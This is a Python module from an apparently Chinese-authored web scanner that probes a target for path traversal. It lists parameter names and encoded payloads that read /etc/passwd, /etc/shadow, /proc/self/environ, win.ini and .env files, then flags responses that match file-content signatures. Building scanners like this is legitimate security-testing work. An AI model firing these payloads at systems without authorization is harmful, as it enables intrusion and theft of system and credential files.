"""
路径穿越（Path Traversal）检测模块
Author: 火柴 | GitHub: huocai250
"""
import logging
from core.logger import C as Colors
log = logging.getLogger("webscan")


import re
from core.scanner import BaseScanner

TRAVERSAL_PARAMS = [
    "file", "path", "page", "doc", "document", "include",
    "filename", "filepath", "folder", "dir", "directory",
    "load", "read", "view", "template", "layout", "theme",
    "module", "section", "lang", "locale", "conf", "cfg",
]

TRAVERSAL_PAYLOADS = [
    # Linux
    "../../../../etc/passwd",
    "../../../etc/passwd",
    "../../etc/passwd",
    "../etc/passwd",
    "....//....//....//etc/passwd",
    "..%2F..%2F..%2Fetc%2Fpasswd",
    "..%252F..%252F..%252Fetc%252Fpasswd",
    "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",
    "..%c0%af..%c0%af..%c0%afetc%c0%afpasswd",
    "/etc/passwd",
    "/etc/shadow",
    "/proc/self/environ",
    "/proc/version",
    # Windows
    "..\\..\\..\\windows\\win.ini",
    "..%5C..%5C..%5Cwindows%5Cwin.ini",
    "C:\\windows\\win.ini",
    "C:/windows/win.ini",
    # Web 应用配置
    "../../../../var/www/html/config.php",
    "../../../../app/config/database.yml",
    "../../../../.env",
]

TRAVERSAL_SIGS = [
    r"root:.*:0:0:", r"\[boot loader\]", r"\[fonts\]",
    r"daemon:.*:/usr", r"/bin/bash", r"WINDIR",
    r"HTTP_HOST", r"DOCUMENT_ROOT",
    r"Linux version", r"processor",
]


class PathTraversalScanner(BaseScanner):
    def run(self):
        _before = self.result.total()
        log.info( "路径穿越（Path Traversal）检测...")
        found = False
        for param in TRAVERSAL_PARAMS:
            if found:
                break
            for payload in TRAVERSAL_PAYLOADS:
                r = self.get(self.target, params={param: payload})
                if r and self._has_traversal(r.text):
                    log.warning("[VULN] " +  f"[路径穿越] 参数: {param} | Payload: {payload[:40]}")
                    self.result.add("路径穿越", "CRITICAL",
                                    f"参数 '{param}' 存在路径穿越漏洞",
                                    f"Payload: {payload}", url=self.target)
                    found = True
                    break
        if not found:
            log.info( "路径穿越检测完成，未发现明显漏洞")
        self._log_module_done("路径穿越", _before)

    def _has_traversal(self, text):
        return any(re.search(p, text) for p in TRAVERSAL_SIGS)
